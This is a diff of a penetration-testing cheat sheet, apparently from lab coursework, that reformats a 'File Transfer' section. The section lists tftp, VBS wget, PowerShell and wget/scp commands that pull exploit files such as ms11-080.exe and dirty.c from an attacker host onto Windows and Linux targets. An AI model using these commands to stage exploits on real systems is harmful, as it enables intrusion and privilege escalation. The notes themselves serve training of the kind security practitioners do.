@@ -32,13 +32,12 @@ Dir \\192.168.1.48\sharename
 
 
 
-# File Transfer
-# Windows
+# File Transfer - Windows
 ``tftp -i 10.11.0.185 GET test.txt``
 
 ```cscript wget.vbs http://10.11.0.158/ms11-080.exe -O C:\lec\ms11-080.exe```
 #### Powershell 2
-``(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe", "C:\lec\accesschk.exe")```
+```(new-object System.Net.WebClient).Downloadfile("http://10.11.0.185/accesschk.exe", "C:\lec\accesschk.exe")```
 
 #### Powershell 3
 ```Invoke-WebRequest "http://10.11.0.130/adfsys.exe" -OutFile "adfsys.exe"```
@@ -54,6 +53,7 @@ Dir \\192.168.1.48\sharename
 
 # Linux
 ```wget http://10.11.0.158/dirty.c -O /tmp/dirty.c```
+
 ```scp root@10.11.0.158:~/Downloads/dirty.c .```
 
 
